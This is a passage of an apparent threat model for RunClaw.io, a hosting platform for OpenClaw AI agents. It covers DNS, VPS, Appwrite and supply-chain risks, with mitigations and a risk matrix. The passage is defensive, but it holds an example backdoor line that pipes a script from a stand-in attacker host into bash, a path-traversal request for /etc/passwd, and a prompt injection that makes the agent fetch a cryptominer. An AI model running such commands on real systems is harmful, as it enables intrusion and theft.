- Include the callback secret in the request body (POST), not the URL, to avoid logging and referrer leakage.
- Verify TLS certificates in the cloud-init script: use `curl --fail --ssl-reqd` or equivalent; never use `curl -k` or `--insecure`.
- Consider mutual TLS (mTLS) for callbacks if the threat model warrants it.

---

### 4.4 TOCTOU on Subdomain Validation

**Threat:** An attacker exploits the time gap between subdomain validation and subdomain registration to claim a subdomain that was validated as available but is registered by another user before the attacker's registration completes.

**Severity:** Medium (CVSS ~5.4)
The check-then-act pattern (validate subdomain availability, then create DNS record) has a race window.

**Attack Vector:**
1. Two users simultaneously request the same subdomain (e.g., `premium-name`).
2. Both requests pass the availability check (the subdomain is not yet registered).
3. Both requests proceed to create DNS records and provision instances.
4. One user ends up with a dangling DNS record or a conflict. Depending on the implementation, one instance's DNS may overwrite the other's.
5. A more malicious variant: attacker uses automated tooling to race against a targeted victim, claiming their desired subdomain.

**Impact:**
- Subdomain conflict: one user's traffic routed to another user's VPS.
- Denial of service for the losing user.
- Potential phishing if the attacker claims a subdomain similar to a legitimate service.

**Evidence in Spec:**
- Subdomain validation checks Cloudflare DNS (or Appwrite database) for existing records.
- DNS record creation and Appwrite document creation are separate operations without transactional guarantees.

**Mitigation:**
- Use a database-level unique constraint on subdomain (Appwrite unique index) as the source of truth.
- Create the Appwrite document (claiming the subdomain) before creating the DNS record. If the document creation fails due to uniqueness violation, abort.
- Use an advisory lock or queue to serialize subdomain registration.
- If the DNS record creation fails after the document is created, clean up the document (compensating transaction).

---

### 4.5 Hetzner API Token Exposure via Server-Side Logs

**Threat:** The Hetzner API token is inadvertently logged in server-side logs, error messages, or stack traces, allowing an attacker with log access to provision, modify, or delete any VPS.

**Severity:** High (CVSS ~8.0)
The Hetzner API token has full access to the Hetzner project, including all VPS instances, SSH keys, volumes, and networking.

**Attack Vector:**
1. The Hetzner API token is included in an HTTP client configuration object.
2. An unhandled error during VPS provisioning logs the full request configuration (including the `Authorization: Bearer <token>` header).
3. Logs are stored in Vercel's log drain, a third-party logging service, or Vercel's built-in log viewer.
4. An attacker with access to logs (compromised logging service, insider threat, Vercel account compromise) reads the token.
5. Attacker uses the token to access the entire Hetzner project.

**Impact:**
- Full control over all VPS instances (create, delete, modify, snapshot).
- Ability to access VPS consoles and exfiltrate data.
- Ability to destroy all customer instances (catastrophic data loss).
- Financial impact from unauthorized server creation.

**Evidence in Spec:**
- The Hetzner API token is used server-side to call the Hetzner Cloud API.
- Error logging in serverless functions often captures request/response details.

**Mitigation:**
- Use structured logging that automatically redacts `Authorization` headers and known secret patterns.
- Store the Hetzner API token in Vercel's encrypted environment variables; never hardcode it.
- Configure the HTTP client to exclude authorization headers from error/debug output.
- Use a Hetzner API token with the minimum required permissions (read/write for servers only, not volumes, SSH keys, etc., if the API supports scoped tokens).
- Rotate the token regularly and monitor Hetzner audit logs for unexpected activity.
- Implement log scrubbing in the logging pipeline to catch accidental secret leakage.

---

## 5. DNS & Network Layer (Cloudflare)

Cloudflare manages DNS records and provides edge security (DDoS protection, TLS termination, proxy). Misconfigurations here can expose customer VPS instances or enable domain takeover.

### 5.1 Subdomain Takeover via Dangling DNS Records

**Threat:** After a customer instance is deleted, the corresponding DNS record is not removed (or removal fails), leaving a dangling CNAME/A record that an attacker can claim.

**Severity:** Critical (CVSS ~9.1)
Subdomain takeover allows an attacker to serve arbitrary content on a RunClaw.io subdomain, enabling phishing, cookie theft (if cookies are scoped to the parent domain), and reputation damage.

**Attack Vector:**
1. Customer `alice` provisions `alice.runclaw.io`, which creates an A record pointing to her Hetzner VPS IP (e.g., `1.2.3.4`).
2. `alice` deletes her instance. The VPS is destroyed, but the Cloudflare DNS record deletion fails silently (API error, timeout, race condition).
3. `alice.runclaw.io` still resolves to `1.2.3.4`, which is now unallocated.
4. Attacker provisions a new Hetzner VPS and, through repeated creation/deletion, obtains the IP `1.2.3.4`.
5. Attacker now serves content on `alice.runclaw.io`.
6. If RunClaw.io sets cookies on `.runclaw.io`, the attacker's VPS can read and set cookies for the parent domain.

**Impact:**
- Phishing: attacker serves convincing content on a `runclaw.io` subdomain.
- Cookie theft: if any cookies are scoped to `.runclaw.io`, the attacker can steal them.
- Reputation damage to RunClaw.io.
- SEO poisoning and malware distribution under a trusted domain.

**Evidence in Spec:**
- DNS records are created via the Cloudflare API during provisioning and should be deleted during instance teardown.
- Instance deletion involves multiple async operations (Hetzner deletion, Cloudflare DNS deletion, Appwrite cleanup).

**Mitigation:**
- Implement DNS record deletion as the first step in instance teardown (before VPS deletion), with mandatory retry and verification.
- After deletion, verify the DNS record is actually gone by querying the Cloudflare API.
- Run a periodic reconciliation job that compares active Cloudflare DNS records against active instances and removes orphaned records.
- Never set cookies on `.runclaw.io`; always use the exact hostname (e.g., `runclaw.io` without the dot prefix).
- Consider using a separate domain for customer subdomains (e.g., `runclaw-app.io`) to isolate cookie scope.

---

### 5.2 DNS Cache Poisoning

**Threat:** An attacker poisons DNS caches to redirect traffic from a customer's subdomain to an attacker-controlled IP.

**Severity:** Low (CVSS ~3.7)
With DNSSEC and Cloudflare's authoritative DNS, traditional cache poisoning is largely mitigated. However, if DNSSEC is not enabled or if resolvers are vulnerable, the risk exists.

**Attack Vector:**
1. Attacker targets a recursive resolver used by victims.
2. Attacker sends forged DNS responses for `alice.runclaw.io` pointing to the attacker's IP.
3. If the resolver does not validate DNSSEC signatures, the forged response is cached.
4. Victims querying through the poisoned resolver are directed to the attacker's server.

**Impact:**
- Traffic hijacking for targeted victims.
- Credential theft if the attacker serves a convincing phishing page.

**Evidence in Spec:**
- DNS is managed via Cloudflare, which supports DNSSEC but requires explicit enablement.

**Mitigation:**
- Enable DNSSEC on the Cloudflare zone.
- Use short TTLs (60-300 seconds) for customer subdomain records to limit poisoning window.
- This risk is largely mitigated by Cloudflare's infrastructure; DNSSEC enablement is the primary action.

---

### 5.3 Cloudflare Proxy Bypass (Direct IP Access)

**Threat:** An attacker discovers the real IP address of a customer VPS and bypasses Cloudflare's proxy, removing DDoS protection, WAF rules, and IP hiding.

**Severity:** Medium (CVSS ~5.8)
If the VPS IP is discoverable (via DNS history, certificate transparency logs, or error messages), attackers can connect directly, bypassing all Cloudflare protections.

**Attack Vector:**
1. Attacker queries DNS history databases (SecurityTrails, VirusTotal) for historical A records of the subdomain.
2. Attacker scans Hetzner IP ranges for the OpenClaw gateway port (18789) or Caddy port (443).
3. Attacker finds the real IP and connects directly, bypassing Cloudflare's WAF, rate limiting, and DDoS protection.
4. Attacker launches DDoS or exploitation attacks directly against the VPS.

**Impact:**
- Loss of Cloudflare protections (DDoS, WAF, bot management).
- Direct exploitation of VPS services not hardened against direct access.
- Information disclosure via direct IP access (server headers, error pages).

**Evidence in Spec:**
- Customer VPS instances have public Hetzner IPs.
- Caddy runs on the VPS and terminates TLS, but Cloudflare is meant to be the front door.
- Cloud-init sets up Caddy as the reverse proxy, but firewall rules depend on the provisioning template.

**Mitigation:**
- Configure VPS firewalls (iptables/nftables or Hetzner Cloud Firewall) to only accept inbound traffic from Cloudflare IP ranges on ports 80 and 443.
- Publish Cloudflare's IP ranges and automate firewall updates when they change.
- Use Cloudflare Authenticated Origin Pulls (client certificate from Cloudflare to origin) to verify that requests come through Cloudflare.
- Do not expose port 18789 (gateway) or any management ports to the public internet.

---

### 5.4 SSL/TLS Downgrade Attacks

**Threat:** An attacker forces a connection downgrade from HTTPS to HTTP or from a strong TLS version to a weaker one, enabling traffic interception.

**Severity:** Medium (CVSS ~4.7)
If Cloudflare's SSL mode is not set to "Full (Strict)" or if HSTS is not configured, downgrade attacks are possible.

**Attack Vector:**
1. Attacker performs an active MITM attack (e.g., on public WiFi).
2. If Cloudflare's SSL mode is "Flexible" (encrypts browser-to-Cloudflare but sends HTTP to origin), the attacker intercepts traffic between Cloudflare and the VPS.
3. If HSTS is not set, the attacker can strip HTTPS from the initial request via an sslstrip attack.
4. The attacker reads and modifies traffic between the user and their OpenClaw instance.

**Impact:**
- Credential interception (gateway tokens, session cookies).
- Traffic modification (injecting malicious content into AI agent responses).
- Privacy violation (reading AI conversations).

**Evidence in Spec:**
- Cloudflare SSL mode is configurable per zone.
- Caddy on the VPS automatically provisions TLS certificates via Let's Encrypt.

**Mitigation:**
- Set Cloudflare SSL mode to "Full (Strict)" to enforce valid TLS between Cloudflare and the origin.
- Enable HSTS with `max-age=31536000; includeSubDomains; preload`.
- Configure Cloudflare to set minimum TLS version to 1.2.
- Enable Automatic HTTPS Rewrites in Cloudflare.
- Consider HSTS preloading for the domain.

---

### 5.5 Wildcard Certificate Risks

**Threat:** Compromise of a wildcard certificate private key allows an attacker to impersonate any subdomain under `runclaw.io`.

**Severity:** Medium (CVSS ~6.4)
If a wildcard certificate (`*.runclaw.io`) is used (either on Cloudflare or on VPS instances), a single key compromise affects all subdomains.

**Attack Vector:**
1. Attacker compromises one customer VPS (via container escape, SSH compromise, etc.).
2. If the VPS holds a wildcard certificate private key, the attacker extracts it.
3. Attacker uses the wildcard certificate to impersonate any `*.runclaw.io` subdomain.
4. Combined with DNS poisoning or proxy bypass, the attacker performs MITM on any customer.

**Impact:**
- Universal impersonation of all customer subdomains.
- Credential theft across the entire platform.
- Requires VPS compromise as a precondition, but the blast radius is platform-wide.

**Evidence in Spec:**
- Caddy on each VPS provisions per-subdomain certificates via Let's Encrypt (ACME).
- Cloudflare provides edge certificates, which may be wildcards on Cloudflare's side.

**Mitigation:**
- Use per-subdomain certificates on VPS instances (Caddy's default behavior with ACME), not wildcard certificates.
- Cloudflare's edge wildcard certificates are managed by Cloudflare and do not expose the private key to customers; verify this is the case.
- If wildcard certificates are used anywhere, store private keys in a hardware security module (HSM) or equivalent.
- Enable Certificate Transparency (CT) monitoring to detect unauthorized certificate issuance for `runclaw.io` subdomains.

---

## 6. Customer VPS Instances

Each customer VPS runs OpenClaw in a Docker container behind a Caddy reverse proxy. The VPS is provisioned and managed by the control plane but operates autonomously.

### 6.1 Container Escape from OpenClaw Docker Container

**Threat:** An attacker exploits a vulnerability in Docker, the Linux kernel, or a misconfigured container to escape the OpenClaw container and gain access to the host VPS.

**Severity:** Critical (CVSS ~9.0)
A container escape grants the attacker root access to the host VPS, including all persistent data, SSH keys, and network access.

**Attack Vector:**
1. The OpenClaw agent executes user-provided code or commands (AI agent capabilities).
2. If the container runs as root (the Dockerfile uses `FROM node:22-bookworm` without dropping privileges), an attacker with code execution inside the container exploits a kernel vulnerability (e.g., CVE-2024-21626 Leaky Vessels, or similar).
3. Alternatively, if the container mounts sensitive host paths (e.g., Docker socket, `/proc`, or `/sys`), the attacker escapes via those mounts.
4. The attacker gains host-level access and can access other containers, persistent volumes, and network interfaces.

**Impact:**
- Full host compromise.
- Access to persistent volumes containing gateway tokens, session data, and user conversations.
- Ability to modify the OpenClaw configuration or replace the binary with a backdoored version.
- Potential lateral movement if the VPS has network access to other infrastructure.

**Evidence in Spec:**
- The Docker Compose configuration mounts host volumes into the container: `${OPENCLAW_CONFIG_DIR}:/home/node/.openclaw`.
- The container runs on a standard Hetzner VPS without additional sandboxing (no gVisor, no Kata containers).
- The Dockerfile does not explicitly drop to a non-root user (`USER node` is not present in the example).

**Mitigation:**
- Run the container as a non-root user: add `USER node` (uid 1000) to the Dockerfile and ensure file permissions are correct.
- Drop all Linux capabilities and add back only what is needed: `cap_drop: [ALL]` in Docker Compose.
- Enable `no-new-privileges: true` in the container security options.
- Do not mount the Docker socket into any container.
- Use a read-only root filesystem where possible: `read_only: true` with tmpfs mounts for writable paths.
- Keep the Docker engine and host kernel updated. Consider using a minimal host OS (e.g., Flatcar, Talos).
- Evaluate gVisor or similar container sandboxing for additional isolation.

---

### 6.2 Caddy Misconfiguration

**Threat:** A misconfigured Caddy reverse proxy allows open proxy access, path traversal, or information disclosure.

**Severity:** High (CVSS ~7.5)
Caddy is the internet-facing component on each VPS. Misconfigurations can expose internal services, allow path traversal to the host filesystem, or turn the VPS into an open proxy.

**Attack Vector:**
1. **Open proxy:** If Caddy is configured with a catch-all `reverse_proxy` directive without host matching, any request routed through the VPS is proxied to the specified backend. Attackers use this to anonymize traffic or attack internal services.
2. **Path traversal:** If Caddy serves static files with a `file_server` directive and does not properly restrict the root, an attacker requests `/../../../etc/passwd` to read host files.
3. **Information disclosure:** Caddy's default error pages or debug endpoints expose version information, internal paths, or stack traces.

**Impact:**
- Open proxy abuse (legal liability, IP reputation damage).
- Unauthorized access to host filesystem.
- Information disclosure aiding further attacks.

**Evidence in Spec:**
- Caddy is provisioned via cloud-init with a Caddyfile template.
- The Caddyfile configuration is generated based on the subdomain and backend port.

**Mitigation:**
- Use explicit host matching in the Caddyfile: `alice.runclaw.io { ... }` -- no catch-all blocks.
- Do not use `file_server` unless specifically needed; if used, restrict to a specific directory with `root /srv/public`.
- Disable Caddy's admin API on the public interface: `admin off` or bind to localhost only.
- Remove or restrict debug and metrics endpoints.
- Review the generated Caddyfile for each instance before deployment; use a Caddyfile linter.

---

### 6.3 SSH Key Management Weaknesses

**Threat:** SSH keys used for VPS management are compromised, stolen, or overly permissive, granting unauthorized access to customer instances.

**Severity:** High (CVSS ~7.8)
SSH is the primary management interface for VPS instances. Weak key management is a common entry point for attackers.

**Attack Vector:**
1. **Shared SSH key:** If all customer VPS instances are provisioned with the same SSH public key (the RunClaw.io management key), compromising one VPS exposes the private key for all instances.
2. **Key in cloud-init:** If the SSH private key is embedded in cloud-init scripts or Hetzner metadata, it is logged or stored in plaintext.
3. **No key rotation:** If SSH keys are never rotated, a historic compromise provides indefinite access.
4. **Password authentication enabled:** If cloud-init does not disable password authentication, attackers can brute-force SSH passwords.

**Impact:**
- Unauthorized root access to customer VPS instances.
- Mass compromise if a shared key is used across all instances.
- Data exfiltration, instance modification, or destruction.

**Evidence in Spec:**
- Hetzner API supports injecting SSH keys during VPS creation.
- Cloud-init can configure SSH settings, including authorized keys and password authentication.

**Mitigation:**
- Generate a unique SSH key pair per VPS instance. Store the private key encrypted in Appwrite, accessible only to the owning user and the control plane.
- Disable SSH password authentication in cloud-init: `ssh_pwauth: false`.
- Use `PermitRootLogin prohibit-password` (key-only root login) or better, create a non-root management user.
- Implement SSH key rotation: regenerate keys quarterly and push updates via the control plane.
- Consider using SSH certificate authorities instead of static keys for centralized access management.
- Audit SSH access logs via the control plane.

---

### 6.4 Inter-Instance Network Isolation

**Threat:** Customer VPS instances can communicate with each other over private Hetzner networks, enabling lateral movement from a compromised instance to other customers' instances.

**Severity:** High (CVSS ~7.2)
If VPS instances share a Hetzner private network or are on the same subnet, a compromised instance can scan and attack neighboring instances.

**Attack Vector:**
1. Attacker compromises their own VPS instance (legitimate customer or via a free trial).
2. Attacker scans the local network and discovers other customer VPS instances on the same Hetzner datacenter subnet.
3. Attacker exploits vulnerabilities in neighboring instances (SSH brute force, unpatched services, exposed management ports).
4. Attacker pivots to additional instances, escalating the breach.

**Impact:**
- Lateral movement from one compromised instance to others.
- Mass compromise of customer instances.
- Data exfiltration from multiple customers.

**Evidence in Spec:**
- Hetzner VPS instances in the same project may share a private network.
- The provisioning pipeline uses the Hetzner API, which can place instances in the same project.

**Mitigation:**
- Do not use Hetzner private networks for customer instances. Each VPS should only have a public IP and communicate with the internet.
- Use Hetzner Cloud Firewalls to restrict inbound traffic to only Cloudflare IPs (ports 80/443) and the control plane IP (for management).
- Block all inter-VPS traffic at the firewall level.
- Consider using separate Hetzner projects per customer for maximum isolation (at the cost of management complexity).
- Run intrusion detection (e.g., Falco) on each VPS to detect lateral movement attempts.

---

### 6.5 Health Check Endpoint Information Disclosure

**Threat:** Health check or status endpoints on the VPS expose internal information (software versions, configuration details, internal IPs) that aids further attacks.

**Severity:** Low (CVSS ~3.5)
Health check endpoints are necessary for monitoring but can leak information if not properly restricted.

**Attack Vector:**
1. Attacker accesses `https://alice.runclaw.io/health` or `https://alice.runclaw.io/api/status`.
2. The endpoint returns detailed information: OpenClaw version, Node.js version, Docker version, Caddy version, uptime, memory usage, connected channels.
3. Attacker uses version information to identify known vulnerabilities (CVE lookup).
4. Internal IP addresses or configuration details aid in network mapping.

**Impact:**
- Information disclosure aiding targeted exploitation.
- Exposure of software versions enabling CVE-based attacks.
- Minimal direct impact, but valuable reconnaissance data.

**Evidence in Spec:**
- OpenClaw gateway exposes a status/health endpoint for monitoring.
- The Hetzner deployment guide shows port exposure configuration.

**Mitigation:**
- Health check endpoints should return minimal information: `{ "status": "ok" }` or just HTTP 200.
- Move detailed status information behind authentication (gateway token).
- Do not expose internal IP addresses, software versions, or configuration details on unauthenticated endpoints.
- Use a separate, non-public endpoint for detailed health monitoring (accessible only from the control plane IP).

---

### 6.6 Resource Exhaustion

**Threat:** An attacker (or a legitimate user's compromised agent) abuses the VPS for cryptocurrency mining, spam relay, network scanning, or other resource-intensive malicious activities.

**Severity:** Medium (CVSS ~6.0)
OpenClaw can execute arbitrary code as part of its AI agent capabilities. Without resource controls, a VPS can be weaponized.

**Attack Vector:**
1. Attacker subscribes to RunClaw.io with a stolen credit card.
2. Once the VPS is provisioned, the attacker (or a prompt injection attack on the AI agent) causes OpenClaw to download and execute a cryptocurrency miner.
3. The miner consumes all CPU/memory, degrading the VPS and potentially triggering Hetzner abuse reports.
4. Alternatively, the attacker uses the VPS as an open SMTP relay, sending spam.
5. Or the attacker uses the VPS as a scanning/attack platform, potentially getting the Hetzner IP range blocklisted.

**Impact:**
- Hetzner abuse reports and potential account suspension (affecting all customers).
- IP reputation damage for the Hetzner IP range.
- Resource exhaustion affecting the customer's OpenClaw instance.
- Financial loss from computing resources consumed.

**Evidence in Spec:**
- OpenClaw has agent capabilities that can execute code.
- The Docker container has access to the VPS's full compute resources unless limited.
- The Hetzner deployment uses small VPS instances ($5/month), which are attractive for mining.

**Mitigation:**
- Set Docker resource limits: `cpus: "1.0"`, `mem_limit: "1g"` in Docker Compose.
- Block outbound SMTP (port 25) at the firewall level.
- Monitor CPU and network usage; alert on sustained high utilization.
- Implement an abuse detection pipeline that checks for known mining pool connections, high outbound traffic, or scanning patterns.
- Use Hetzner Cloud Firewalls to restrict outbound traffic to known-good ports (80, 443, and specific API endpoints).
- Include acceptable use terms in the Terms of Service and implement automated enforcement.

---

## 7. Data Store (Appwrite)

Appwrite Cloud stores all platform data: user accounts, instance metadata, configuration, and billing relationships. The security of Appwrite's permission model is critical.

### 7.1 Appwrite Permission Model Bypass

**Threat:** An attacker bypasses Appwrite's document-level permissions to read or modify documents belonging to other users.

**Severity:** High (CVSS ~8.0)
Appwrite's permission model is powerful but complex. Misconfigured collection or document permissions can expose data across user boundaries.

**Attack Vector:**
1. If the `instances` collection has collection-level read permission for `role:member` (any authenticated user), then any authenticated user can list all instances.
2. If document-level permissions are not enforced (or are overridden by collection-level settings), a user can read another user's instance documents by querying the collection.
3. If the API routes use a server-side API key (which bypasses all Appwrite permissions), the application code must enforce all access control -- any missing check is a vulnerability.

**Impact:**
- Unauthorized access to other users' instance data (IP addresses, gateway tokens, subdomain configurations).
- Ability to enumerate all platform users and their instances.
- Potential for data modification if write permissions are also misconfigured.

**Evidence in Spec:**
- Appwrite Cloud stores instance data in collections.
- The Next.js control plane uses both client-side (session-based) and server-side (API key-based) Appwrite SDK calls.
- Server-side API key calls bypass Appwrite's permission model entirely.

**Mitigation:**
- Set collection-level permissions to require document-level permissions (disable collection-wide read/write for `role:member`).
- Set document-level permissions explicitly: `read("user:<userId>")`, `write("user:<userId>")` for each document.
- For server-side API key calls, always include an ownership check in the application code: verify `document.userId === session.userId` before returning data.
- Audit Appwrite collection permissions quarterly.
- Write integration tests that verify cross-user access is denied.

---

### 7.2 Document-Level Permission Escalation

**Threat:** An attacker modifies the permissions on their own documents to grant access to other users' accounts, or modifies another user's document permissions to grant themselves access.

**Severity:** Medium (CVSS ~5.5)
If the Appwrite SDK allows clients to set permissions when creating or updating documents, an attacker could add `read("user:victimUserId")` to their own malicious documents, or more critically, if they can update another user's document permissions.

**Attack Vector:**
1. Attacker calls the Appwrite API (client-side) to update their instance document.
2. In the update payload, the attacker includes `$permissions: [read("user:*")]`, making the document readable by all users.
3. If the Appwrite collection allows clients to set permissions (not restricted to server-side only), the update succeeds.
4. More critically: if a server-side route updates a document with user-provided permission arrays without validation, an attacker can grant themselves access to any document.

**Impact:**
- Information disclosure: attacker makes their document public or readable by a specific victim.
- Privilege escalation: attacker grants themselves write access to another user's documents.

**Evidence in Spec:**
- Appwrite documents support `$permissions` arrays that can be set at creation and update time.
- Client-side Appwrite SDK calls include the session user's permissions by default, but custom permissions can be supplied.

**Mitigation:**
- Never allow client-supplied permission arrays. Always set permissions server-side using the API key, with hardcoded permission patterns.
- Disable client-side document permission updates in the Appwrite collection settings (use "Document Security" mode with server-side-only permission management).
- Validate that all permission modification routes on the server side only accept the authenticated user's own user ID.

---

### 7.3 API Key Scope Over-Privilege

**Threat:** The Appwrite API key used by the Next.js control plane has excessive permissions, allowing an attacker who compromises the API key to access or modify all data in the Appwrite project.

**Severity:** High (CVSS ~8.5)
A single API key with full project access is a high-value target. Compromise grants complete control over all platform data.

**Attack Vector:**
1. Attacker compromises the Appwrite API key (via log exposure, environment variable leak, or Vercel account compromise).
2. The API key has full project scope: read/write on all collections, user management, file storage, etc.
3. Attacker uses the key to dump all user accounts, instance data, and configuration.
4. Attacker modifies or deletes data, disrupting the platform.
5. Attacker creates admin accounts or elevates existing accounts.

**Impact:**
- Complete data breach: all user accounts, instances, and configurations exposed.
- Data destruction or manipulation.
- Ability to create backdoor accounts.
- Platform-wide denial of service.

**Evidence in Spec:**
- The Next.js control plane uses an Appwrite server-side API key to perform operations on behalf of users.
- Appwrite API keys can be scoped to specific permissions (collections, operations) but are often created with full access for convenience.

**Mitigation:**
- Create scoped API keys with minimum required permissions. Create separate keys for different operations (e.g., one for user management, one for instance CRUD, one for billing).
- Use Appwrite's API key scope restrictions to limit each key to specific collections and operations.
- Store API keys in Vercel's encrypted environment variables; never hardcode them.
- Rotate API keys quarterly.
- Monitor Appwrite audit logs for unexpected API key usage patterns.
- Implement IP allowlisting for API key usage if Appwrite supports it.

---

### 7.4 Backup and Export Data Exposure

**Threat:** Appwrite Cloud backups or data exports are stored in an insecure location, accessed by unauthorized parties, or retained beyond their useful life.

**Severity:** Medium (CVSS ~5.0)
Platform-level backups contain all user data and are valuable targets for attackers.

**Attack Vector:**
1. RunClaw.io configures periodic Appwrite data exports for disaster recovery.
2. Exports are stored in a cloud storage bucket (S3, GCS) with misconfigured permissions (public read, overly broad IAM policies).
3. Attacker discovers the bucket (via DNS enumeration, bucket brute forcing, or error messages) and downloads the export.
4. Alternatively, an insider or compromised CI/CD pipeline accesses the backup storage.

**Impact:**
- Complete data breach: all historical user data, instance configurations, and secrets.
- Compliance violations (GDPR, CCPA) if personal data is exposed.

**Evidence in Spec:**
- Appwrite Cloud manages its own backups, but RunClaw.io may also implement application-level backups or exports.
- Backup storage configuration is separate from the main Appwrite project.

**Mitigation:**
- If using custom backups, store them in encrypted storage with strict access controls (least privilege IAM policies, no public access).
- Enable server-side encryption (SSE-KMS) on backup storage.
- Implement backup retention policies: delete backups older than the retention period.
- Audit access to backup storage quarterly.
- If relying solely on Appwrite Cloud's built-in backups, verify Appwrite's backup security SLA and retention policies.

---

## 8. Supply Chain

Supply chain attacks target the software and infrastructure dependencies that RunClaw.io relies on. A compromised dependency or image can affect all customers simultaneously.

### 8.1 Docker Image Tampering

**Threat:** The `openclaw/openclaw:latest` Docker image is tampered with at the registry level, or a malicious image is substituted via tag manipulation, injecting backdoors into all customer instances.

**Severity:** Critical (CVSS ~9.5)
Every customer VPS pulls and runs this image. Compromising it compromises every customer simultaneously.

**Attack Vector:**
1. Attacker compromises the Docker Hub account for `openclaw/openclaw` (credential theft, token leakage, or registry vulnerability).
2. Attacker pushes a modified image with the `latest` tag that includes a backdoor (reverse shell, credential stealer, crypto miner).
3. All new customer VPS instances pull the compromised image during provisioning.
4. Existing instances are also compromised if they auto-update by pulling `latest`.
5. Alternatively, a typosquatting attack: attacker publishes `openclaww/openclaw` and the cloud-init script has a typo.

**Impact:**
- Mass compromise of all customer instances.
- Backdoor access to all customer data and conversations.
- Cryptocurrency mining, spam relay, or botnet enrollment across all instances.
- Complete loss of platform trust.

**Evidence in Spec:**
- The cloud-init template pulls `openclaw/openclaw:latest` from Docker Hub.
- Docker Hub does not require image signing by default.
- Using the `latest` tag means the exact image version is not pinned.

**Mitigation:**
- **Pin image digests:** Use `openclaw/openclaw@sha256:<digest>` instead of `:latest`. Update the digest in the cloud-init template only after verification.
- **Enable Docker Content Trust (DCT):** Sign images with Notary and verify signatures during pull.
- **Use a private registry:** Mirror the image to a private registry (e.g., Hetzner Container Registry, GitHub Container Registry) and pull from there.
- **Implement image scanning:** Scan images for known vulnerabilities (Trivy, Snyk) before deployment.
- **Automate verification:** In the CI/CD pipeline, verify the image checksum against a known-good list before updating the cloud-init template.
- **Never use `latest` in production:** Always use a specific version tag plus digest.

---

### 8.2 Cloud-Init Template Injection via Compromised Build

**Threat:** An attacker compromises the build pipeline or source repository to inject malicious content into the cloud-init template, which is then executed on every newly provisioned VPS.

**Severity:** Critical (CVSS ~9.5)
The cloud-init template is a shell script executed as root. Compromising its source affects all future provisioning.

**Attack Vector:**
1. Attacker compromises the source repository (via stolen developer credentials, malicious PR, or dependency confusion).
2. Attacker modifies the cloud-init template in the codebase to include a backdoor command (e.g., `curl attacker.com/backdoor.sh | bash`).
3. The change passes code review (obfuscated or hidden in a large PR).
4. The modified template is deployed to Vercel.
5. All new VPS instances are provisioned with the backdoored cloud-init, giving the attacker root access.

**Impact:**
- Root-level access to all newly provisioned VPS instances.
- Persistent backdoor across all future instances.
- Extremely difficult to detect if the backdoor is subtle (e.g., a cron job that phones home).

**Evidence in Spec:**
- Cloud-init templates are stored in the source repository and deployed as part of the Next.js application.
- The template is a critical security boundary (user input to root execution).

**Mitigation:**
- Require mandatory code review (minimum 2 reviewers) for any changes to cloud-init templates.
- Implement branch protection rules on the repository: no direct pushes to main, required status checks.
- Store cloud-init templates as separate, versioned artifacts (not inline strings in the codebase) with integrity checksums.
- Implement git commit signing and verify signatures in CI.
- Run a diff-based audit on cloud-init template changes: flag any new `curl`, `wget`, `bash -c`, or network commands.
- Consider a separate, locked-down repository for provisioning templates.

---

### 8.3 npm Dependency Poisoning

**Threat:** A malicious npm package is introduced into the Next.js control plane's dependency tree, executing arbitrary code on the Vercel serverless functions.

**Severity:** High (CVSS ~8.1)
The Next.js application has a large dependency tree. A compromised dependency runs with the same permissions as the application, including access to Hetzner, Cloudflare, and Stripe API keys.

**Attack Vector:**
1. **Dependency confusion:** Attacker publishes a package with the same name as an internal package to the public npm registry.
2. **Typosquatting:** Attacker publishes `stripe-nod` (instead of `stripe-node`) and a developer accidentally installs it.
3. **Compromised maintainer:** A legitimate package maintainer's account is compromised, and a malicious version is published.
4. **Post-install scripts:** The malicious package's `postinstall` script exfiltrates environment variables (API keys) to an attacker-controlled server.
5. **Runtime payload:** The malicious package includes code that runs during the Next.js build or at runtime, exfiltrating secrets or modifying behavior.

**Impact:**
- Exfiltration of all API keys (Hetzner, Cloudflare, Stripe, Appwrite).
- Backdoor in the control plane, allowing arbitrary actions.
- Supply chain compromise affecting all users.

**Evidence in Spec:**
- The Next.js application is deployed on Vercel, which runs `npm install` or `pnpm install` during deployment.
- Environment variables containing API keys are available during build and runtime.

**Mitigation:**
- Use a lockfile (`pnpm-lock.yaml`) and verify its integrity in CI.
- Enable npm audit in CI and block deployments with known critical vulnerabilities.
- Use `--ignore-scripts` during install to prevent `postinstall` attacks (verify compatibility).
- Pin exact dependency versions (no `^` or `~` for critical dependencies).
- Use a private npm registry or proxy (Verdaccio, Artifactory) to control which packages are available.
- Implement Software Bill of Materials (SBOM) generation and monitoring.
- Review dependency changes in PRs: flag new dependencies or version bumps for manual review.

---

### 8.4 Caddy Image Tampering

**Threat:** The Caddy Docker image used on customer VPS instances is tampered with, introducing vulnerabilities or backdoors into the reverse proxy layer.

**Severity:** High (CVSS ~7.9)
Caddy terminates TLS and handles all inbound traffic. A compromised Caddy image can intercept all traffic, steal credentials, or redirect requests.

**Attack Vector:**
1. Attacker compromises the official Caddy Docker Hub image or the cloud-init script references a non-official image.
2. The modified Caddy image includes a TLS interception module that logs all decrypted traffic.
3. All customer VPS instances pull the compromised image during provisioning.
4. The attacker receives all decrypted traffic, including gateway tokens, user messages, and AI responses.

**Impact:**
- Mass traffic interception across all customer instances.
- Credential theft (gateway tokens, session cookies).
- Complete loss of confidentiality for all customer communications.

**Evidence in Spec:**
- Caddy is installed on customer VPS instances via cloud-init (either as a Docker image or a binary download).
- Caddy handles TLS termination and reverse proxying to the OpenClaw container.

**Mitigation:**
- Pin the Caddy image to a specific version and digest: `caddy:2.8.4@sha256:<digest>`.
- Verify Caddy binary checksums when installing via `curl` in cloud-init.
- Use Caddy's official Docker image from a verified publisher.
- Scan the Caddy image for vulnerabilities before incorporating it into the provisioning pipeline.
- Consider building a custom Caddy image from source in a controlled CI pipeline and pushing it to a private registry.

---

## Summary Risk Matrix

| # | Attack Surface | Severity | CVSS Est. | Category |
|---|---------------|----------|-----------|----------|
| 4.1 | Cloud-init injection via subdomain field | Critical | 9.8 | VPS Provisioning |
| 8.1 | Docker image tampering (openclaw) | Critical | 9.5 | Supply Chain |
| 8.2 | Cloud-init template injection via compromised build | Critical | 9.5 | Supply Chain |
| 1.1 | API route authentication bypass | Critical | 9.1 | Control Plane |
| 5.1 | Subdomain takeover via dangling DNS records | Critical | 9.1 | DNS & Network |
| 1.3 | SSRF via cloud-init template injection | Critical | 9.8 | Control Plane |
| 3.1 | Webhook signature bypass/replay | Critical | 9.0 | Payment Flow |
| 6.1 | Container escape from Docker | Critical | 9.0 | Customer VPS |
